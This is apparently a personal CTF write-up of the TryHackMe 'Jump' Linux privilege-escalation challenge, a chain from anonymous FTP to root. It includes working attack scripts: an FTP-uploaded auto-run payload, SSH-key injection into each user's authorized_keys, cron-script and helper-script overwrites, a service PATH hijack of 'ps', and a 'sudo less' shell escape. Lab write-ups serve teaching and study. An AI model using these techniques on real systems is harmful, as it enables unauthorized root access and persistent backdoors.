# Jump (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Privilege Escalation. A Linux privesc **challenge** (capstone),
  companion to the Windows [[windows-jump]].
- **Room:** Jump (~60 min, premium). Escalate through a misconfigured automation pipeline:
  `anonymous -> recon_user -> dev_user -> monitor_user -> ops_user -> root` (5 flags). Theme: "each stage
  relies too heavily on the previous one" - every hop is one over-trusted file / group / PATH / sudoers rule.
- **Date:** 2026-10-18.
- **Status:** SOLVED - all 5 flags (verified by reading each home's `flag.txt` as root).
- **Target:** `<ip>` (`tryhackme-2404`, Ubuntu). Open ports: **21 (vsFTPd 3.0.5, anonymous)** and
  **22 (SSH)**.
- **Method:** fully headless from the Windows PC - anonymous FTP for the foothold, then Python `paramiko`
  SSH, injecting the same ed25519 key into each user's `authorized_keys` as I pivoted (one reusable key, one
  `run()` helper). See the working method in [[linux-privilege-escalation-automation]].

## The pipeline (map before touching anything)

| Stage | Runs as | Trigger | Over-trusts |
|-------|---------|---------|-------------|
| recon | recon_user | `/opt/recon/scan_uploads.sh` -> `bash incoming/*.sh` | anyone who can write FTP `incoming/` |
| dev backups | dev_user | cron -> `/opt/dev/backup.sh` | the `dev_user` **group** (which recon_user is in) |
| monitoring | monitor_user | `healthcheck.service` -> `ps aux` every 5s | `/opt/dev/bin` on its PATH (dev's dir) |
| deployment | ops_user | `sudo deploy.sh` -> `/opt/app/deploy_helper.sh` | `deploy_helper.sh` is monitor-owned |
| - | root | `sudo /usr/bin/less` | ops_user sudoers |

## Hop 1 - anonymous -> recon_user (writable FTP "job" dir, auto-executed)

Anonymous FTP's `pub/README.txt` gives it away: *"All recon jobs must be placed in incoming/. Files are
processed automatically on arrival."* `/opt/recon/scan_uploads.sh` (running as recon_user) does
`for f in /srv/ftp/incoming/*.sh; do /bin/bash "$f" & done`. So **upload a `.sh` to `incoming/` and it runs
as recon_user**. I uploaded a job that installs my SSH key:

```python
# anonymous FTP upload (ftplib)
f=ftplib.FTP(); f.login('anonymous','x')
f.storbinary('STOR /incoming/recon.sh', payload)   # payload appends my key to ~/.ssh/authorized_keys
```
```bash
# payload (runs as recon_user via the pipeline):
mkdir -p "$HOME/.ssh"; echo "<ed25519 pubkey>" >> "$HOME/.ssh/authorized_keys"
chmod 700 "$HOME/.ssh"; chmod 600 "$HOME/.ssh/authorized_keys"
# (also dumped id + flag to the world-writable pub/uploads/ as a feedback channel)
```
Then `ssh -i key recon_user@target`. Flag `THM{…}`. recon_user's groups:
`recon_user, dev_user, devops` - the key to hop 2.

## Hop 2 - recon_user -> dev_user (group-writable script run by a cron)

`/opt/dev/backup.sh` is `-rwxrwxr-x dev_user:dev_user` (**group-writable**) and runs periodically **as
dev_user** (it writes `/tmp/recon_backup.tgz`). recon_user is in the `dev_user` group, so overwrite it
(keep its `tar` line, append the key install for dev_user):

```bash
cat > /opt/dev/backup.sh <<'EOS'
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user 2>/dev/null
mkdir -p /home/dev_user/.ssh
grep -q jump /home/dev_user/.ssh/authorized_keys 2>/dev/null || echo "<pubkey>" >> /home/dev_user/.ssh/authorized_keys
chmod 700 /home/dev_user/.ssh; chmod 600 /home/dev_user/.ssh/authorized_keys
EOS
```
(`cat >` works via group write even though `chmod` is denied - truncating reuses the inode and keeps the
existing `+x` mode.) Next cron run -> `ssh dev_user`. dev_user's `flag.txt` was world-readable anyway:
`THM{…}`.

## Hop 3 - dev_user -> monitor_user (PATH hijack via a service's PATH)

`healthcheck.service` (`systemctl cat`): `User=monitor_user`,
`Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin`, `ExecStart=/usr/local/bin/healthcheck` - which
loops `ps aux` every 5s. Because **`/opt/dev/bin` is first on PATH** and `/opt/dev/bin/ps` is writable by
dev_user, bare `ps` resolves to our script, executed as monitor_user. (A decoy reverse-shell `ps` was
already planted there - the intended hijack point.) Replace it, exec the real `ps` so the healthcheck stays
clean:

```bash
cat > /opt/dev/bin/ps <<'EOS'
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
grep -q jump /home/monitor_user/.ssh/authorized_keys 2>/dev/null || echo "<pubkey>" >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh; chmod 600 /home/monitor_user/.ssh/authorized_keys
exec /usr/bin/ps "$@"
EOS
chmod +x /opt/dev/bin/ps
```
~5s later -> `ssh monitor_user`. Flag `THM{…}`.

## Hop 4 - monitor_user -> ops_user (sudo to a script that calls a writable helper)

`sudo -l` for monitor_user: `(ops_user) NOPASSWD: /usr/local/bin/deploy.sh`. And `deploy.sh` is just:
```bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```
`/opt/app/deploy_helper.sh` is **owned/writable by monitor_user**. So rewrite the helper and run the sudo
command - `deploy.sh` executes our helper as ops_user:

```bash
cat > /opt/app/deploy_helper.sh <<'EOS'
#!/bin/bash
mkdir -p /home/ops_user/.ssh
grep -q jump /home/ops_user/.ssh/authorized_keys 2>/dev/null || echo "<pubkey>" >> /home/ops_user/.ssh/authorized_keys
chmod 700 /home/ops_user/.ssh; chmod 600 /home/ops_user/.ssh/authorized_keys
EOS
chmod +x /opt/app/deploy_helper.sh
sudo -n -u ops_user /usr/local/bin/deploy.sh     # -> runs helper as ops_user
```
`ssh ops_user`. Flag `THM{…}`.

## Hop 5 - ops_user -> root (sudo less, GTFOBins)

`sudo -l` for ops_user: `(root) NOPASSWD: /usr/bin/less`. `less` is a GTFOBins shell-escape - run it as
root, then from the pager type `!/bin/bash` to spawn a root shell:

```bash
sudo -n /usr/bin/less /etc/hostname
# in the pager:
!/bin/bash        # -> root shell (uid=0)
# then install a key into /root/.ssh and read the flag
```
Driven over a paramiko PTY (`invoke_shell`), since `less` needs a terminal. `uid=0(root)`. Flag
`THM{…}`.

## Lessons learned

- **Follow the trust, not the tool.** The room is one idea repeated: every service/cron/sudo rule trusts an
  object (a dir, a group, a PATH entry, a helper script) that a lower user controls. Enumerate at each hop:
  `id`/`sudo -l`, then `find / -group <mygroups>` and look for **group-writable or self-owned files that a
  higher user runs**.
- **Group membership is a capability.** recon_user being in `dev_user`/`devops` was the whole of hop 2 -
  `getent group` + `find -group` finds these fast.
- **A service's `Environment=PATH` is attacker surface.** `systemctl cat <svc>` - if a writable dir is on
  the PATH of a service that calls bare binaries (`ps`, `tar`, ...), that's a hijack. (Linux cousin of the
  Windows unquoted-service-path / PATH-hijack in [[windows-privilege-escalation]].)
- **`sudo -l` at every hop.** Hops 4 and 5 were both sudo rules; `less` is a `GTFOBins` classic (`!cmd`).
  Always check GTFOBins for whatever a `NOPASSWD` entry lets you run.
- **SSH-key injection beats shells for a chain.** Dropping one reusable pubkey into each user's
  `authorized_keys` turned a 5-stage pivot into five clean, scriptable `ssh -i key <user>@host` logins -
  far better than juggling reverse shells, and it let me drive the whole box headlessly with `paramiko`.
- **Give async triggers a feedback channel.** For the FTP/cron hops I had the payload also write `id`+flag
  to a world-readable spot (and just polled SSH), so I knew the moment each stage fired.

## Flags

| # | User | Vector | Flag |
|---|------|--------|------|
| 1 | recon_user | anon-FTP `incoming/` auto-exec | `THM{…}` |
| 2 | dev_user | group-writable `/opt/dev/backup.sh` (cron) | `THM{…}` |
| 3 | monitor_user | service PATH hijack of `ps` (`/opt/dev/bin`) | `THM{…}` |
| 4 | ops_user | `sudo deploy.sh` -> writable `deploy_helper.sh` | `THM{…}` |
| 5 | root | `sudo /usr/bin/less` GTFOBins escape | `THM{…}` |

## Related

- [[windows-jump]] - the Windows guest->SYSTEM sibling challenge (same "chain of over-trust" design).
- [[linux-privilege-escalation-basics]] - sudo/SUID/caps/cron/PATH vectors used here, one at a time.
- [[linux-privilege-escalation-automation]] - the paramiko SSH working method and cron-abuse pattern.
- [[privesc-module-plan]] - module tracker.
